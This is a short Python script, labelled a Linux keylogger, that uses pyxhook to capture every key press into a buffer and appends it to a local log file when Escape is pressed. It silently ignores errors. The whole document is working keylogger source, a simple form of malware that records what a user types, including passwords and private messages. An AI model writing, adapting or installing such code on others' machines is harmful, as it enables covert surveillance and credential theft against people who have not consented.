#!/usr/bin/python

#Keylogger for linux 

import pyxhook
import sys
import os 
import keyboard


def getOnKeyPress(buff):
    def onKeyPress(event):
        if event.Key == 'Escape':
            cls()
            with open("log_file.txt", 'a+') as f:
                f.write('{} '.format(buff['buff']))
            sys.exit(0)
        elif event.Key == 'space':
            buff['buff'] += ' '
        elif event.Key == 'Return':
            buff['buff'] += '\n'
        else:       
            buff['buff'] += '{}'.format(event.Key)
    return onKeyPress


def cls():
    os.system('cls' if os.name=='nt' else 'clear')



def main():

    buff = dict()
    buff['buff'] = ''
    hook = pyxhook.HookManager()
    hook.KeyDown = getOnKeyPress(buff)
    hook.HookKeyboard()

    try:
        hook.start()
    except KeyboardInterrupt:
        pass
    except Exception as err:
        pass


if __name__ == "__main__":
    main()
